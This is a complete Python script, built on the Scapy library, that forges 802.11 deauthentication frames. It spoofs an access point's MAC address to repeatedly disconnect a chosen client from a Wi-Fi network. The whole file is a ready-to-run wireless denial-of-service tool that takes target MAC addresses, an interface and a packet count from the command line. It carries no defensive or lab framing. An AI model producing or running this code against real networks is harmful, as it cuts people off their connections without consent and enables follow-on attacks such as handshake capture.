from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import sys

def send_deauth(ap_mac, client_mac, interface, count=10):
    dot11 = Dot11(type=0, subtype=12, addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

    print(f"Sending {count} deauth packets from {ap_mac} to {client_mac} on {interface}")
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=1)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: sudo python3 custom_deauth.py <AP MAC> <Client MAC> <interface> <count>")
        sys.exit(1)

    ap_mac = sys.argv[1]
    client_mac = sys.argv[2]
    interface = sys.argv[3]
    count = int(sys.argv[4])

    send_deauth(ap_mac, client_mac, interface, count)
